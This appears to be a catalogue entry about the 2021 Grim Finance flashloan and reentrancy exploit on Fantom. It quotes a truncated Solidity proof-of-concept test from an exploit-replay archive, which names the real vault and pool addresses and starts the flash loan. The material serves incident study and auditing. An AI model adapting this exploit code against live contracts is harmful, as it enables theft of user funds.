# [?] Grim Finance - Flashloan & Reentrancy

## Summary
Severity: Unknown
Chain: Fantom
Component: Grim
Published: 2021-12-18
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-12/Grim_exp.sol
Type: defi-exploit-poc

## Details
```solidity
contract ContractTest is Test {
    address btcAddress = 0x321162Cd933E2Be498Cd2267a90534A804051b11;
    address wftmAddress = 0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83;
    address routerAddress = 0x16327E3FbDaCA3bcF7E38F5Af2599D2DDc33aE52;
    address btc_wftm_address = 0x279b2c897737a50405ED2091694F225D83F2D3bA; //Spirit LPs
    address beethovenVaultAddress = 0x20dd72Ed959b6147912C2e529F0a0C651c33c9ce; //Flash Loan Pool
    address grimBoostVaultAddress = 0x660184CE8AF80e0B1e5A1172A16168b15f4136bF;
    IERC20 btc = IERC20(btcAddress);
    IWFTM wftm = IWFTM(payable(wftmAddress));
    IUniswapV2Router router = IUniswapV2Router(payable(routerAddress)); //SpiritSwap Router
    IPancakePair btc_wftm = IPancakePair(btc_wftm_address);
    IBeethovenVault beethovenVault = IBeethovenVault(beethovenVaultAddress);
    IGrimBoostVault grimBoostVault = IGrimBoostVault(grimBoostVaultAddress);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    uint256 btcLoanAmount = 30 * 1e8;
    uint256 wftmLoanAmount = 937_830 * 1e18;
    uint256 reentrancySteps = 7;
    uint256 lpBalance;

    function setUp() public {
        cheats.createSelectFork("fantom", 25_345_002); //fork fantom at block 25345002
    }

    function testExploit() public {
        //Flash Loan WFTM and "BTC" frm BeethovenX
        IERC20[] memory loanTokens = new IERC20[](2);
        loanTokens[0] = wftm;
        loanTokens[1] = btc;
        uint256[] memory loanAmounts = new uint256[](2);
        loanAmounts[0] = wftmLoanAmount;
        loanAmounts[1] = btcLoanAmount;
        beethovenVault.flashLoan(IFlashLoanRecipient(address(this)), loanTokens, loanAmounts, "0x");
    }

    // Called after receiving Flash Loan Funds
    function receiveFlashLoan(
        IERC20[] memory tokens,
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-12/Grim_exp.sol_
